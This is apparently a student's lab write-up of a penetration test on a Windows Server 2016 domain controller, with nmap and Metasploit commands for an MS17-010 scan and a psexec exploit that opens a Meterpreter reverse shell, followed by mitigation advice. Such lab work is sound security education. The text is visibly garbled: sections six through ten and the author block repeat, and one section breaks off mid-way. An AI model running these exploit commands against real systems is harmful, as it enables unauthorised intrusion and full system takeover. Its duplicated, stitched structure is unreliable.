# Security Evaluation & Penetration Testing – Windows Server 2016  
### Final Project – VAPT Assessment

## Overview
This project demonstrates the deployment, configuration, and security evaluation of a **Windows Server 2016** environment, followed by a complete **Vulnerability Assessment and Penetration Testing (VAPT)** process. The assessment includes identifying network vulnerabilities, executing exploits, and testing defenses using industry-standard tools.

---

## 1. Project Objectives
- Deploy Windows Server 2016 and Windows Client in a virtual lab environment  
- Configure **Active Directory Domain Services (AD DS)**  
- Create domain users and validate authentication  
- Conduct vulnerability scanning  
- Perform exploitation attempts using EternalBlue and PSExec  
- Provide mitigation strategies

---

## 2. Technologies & Tools Used
- Windows Server 2016  
- Windows Client OS  
- Active Directory Domain Services (AD DS)  
- Nmap  
- Metasploit Framework  
- SMB Services (445/tcp)  
- VMware / VirtualBox  

---

## 3. Project Structure

```/project-root
│
├── Deployment/
│ ├── Windows Server Setup
│ ├── AD DS Configuration
│ └── Domain & User Creation
│
├── Scanning/
│ ├── nmap-results.txt
│ └── smb-vulnerability-scan
│
├── Exploits/
│ ├── eternalblue-attempt-1
│ ├── psexec-success
│ └── eternalblue-successful-reattempt
│
├── Reports/
│ └── Final-Project-Report.pdf
│
└── README.md
```

---

## 4. Deployment & Configuration  
### Task 1: Server Setup
- Installed Windows Server 2016  
- Configured **Active Directory Domain Services (AD DS)**  
- Promoted server to domain controller  
- Created two domain users  

---

## 5. Vulnerability Assessment  

### Nmap Scanning  
Command:
nmap -sV -T4 -A -p- <target-ip>

Findings:  
- Port **445/tcp open**  
- SMBv1 enabled  
- Vulnerable to **MS17-010 (EternalBlue)**  

### Metasploit SMB Scanner  
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target-ip>
exploit

Confirmed: **MS17-010 Vulnerability**

---

## 6. Exploitation Attempts  

### Attempt 1: EternalBlue  
- Initial execution failed  
- Possible reasons: partial patching, unstable memory state, execution conditions

### Attempt 2: PSExec (Successful)
Confirmed: **MS17-010 Vulnerability**

---

## 6. Exploitation Attempts  

### Attempt 1: EternalBlue  
- Initial execution failed  
- Possible reasons: partial patching, unstable memory state, execution conditions

### Attempt 2: PSExec (Successful)
use exploit/windows/smb/psexec
set RHOSTS <target-ip>
set SMBUser administrator
set SMBPass <password>
set payload windows/meterpreter/reverse_tcp
exploit

Result:  
- Meterpreter session opened  
- Full system access gained  

### Reattempt: EternalBlue (Successful)
- After PSExec access, EternalBlue executed successfully  
- Indicates environmental/state change on the target

---

## 7. Exploit Comparison  
| Criteria | EternalBlue (MS17-010) | windows/smb/psexec |
|---------|--------------------------|---------------------|
| Attack Type | Remote Code Execution | Credential-Based Execution |
| Credentials Needed | No | Yes (Admin) |
| First Result | Failed | Successful |
| Final Result | Successful after reattempt | Not required again |

---

## 8. Why EternalBlue Worked Later
- System state changed after PSExec  
- Memory conditions allowed exploitation  
- Security controls/logs modified during initial exploitation  

---

## 9. Mitigation Strategies
- Apply all Windows security updates  
- Disable **SMBv1** protocol  
- Restrict SMB traffic with firewalls  
- Deploy IDS/IPS to detect SMB anomalies  
- Use strong authentication and limit admin privileges  
- Conduct regular vulnerability scans  

---

## 10. Conclusion
This project demonstrates a complete end-to-end VAPT workflow on a Windows Server 2016 environment. It highlights how outdated protocols, missing patches, and service misconfigurations can expose systems to critical risks. The comparison between EternalBlue and PSExec emphasizes the importance of layered security.

---

## Author
**Noor-ul-ain Ahmed**  
Cybersecurity Student | Penetration Testing Enthusiast

Result:  
- Meterpreter session opened  
- Full system access gained  

### Reattempt: EternalBlue (Successful)
- After PSExec access, EternalBlue executed successfully  
- Indicates environmental/state change on the target

---

## 7. Exploit Comparison  
| Criteria | EternalBlue (MS17-010) | windows/smb/psexec |
|---------|--------------------------|---------------------|
| Attack Type | Remote Code Execution | Credential-Based Execution |
| Credentials Needed | No | Yes (Admin) |
| First Result | Failed | Successful |
| Final Result | Successful after reattempt | Not required again |

---

## 8. Why EternalBlue Worked Later
- System state changed after PSExec  
- Memory conditions allowed exploitation  
- Security controls/logs modified during initial exploitation  

---

## 9. Mitigation Strategies
- Apply all Windows security updates  
- Disable **SMBv1** protocol  
- Restrict SMB traffic with firewalls  
- Deploy IDS/IPS to detect SMB anomalies  
- Use strong authentication and limit admin privileges  
- Conduct regular vulnerability scans  

---

## 10. Conclusion
This project demonstrates a complete end-to-end VAPT workflow on a Windows Server 2016 environment. It highlights how outdated protocols, missing patches, and service misconfigurations can expose systems to critical risks. The comparison between EternalBlue and PSExec emphasizes the importance of layered security.

---

## Author
**Noor-ul-ain Ahmed**  
Cybersecurity Student | Penetration Testing Enthusiast


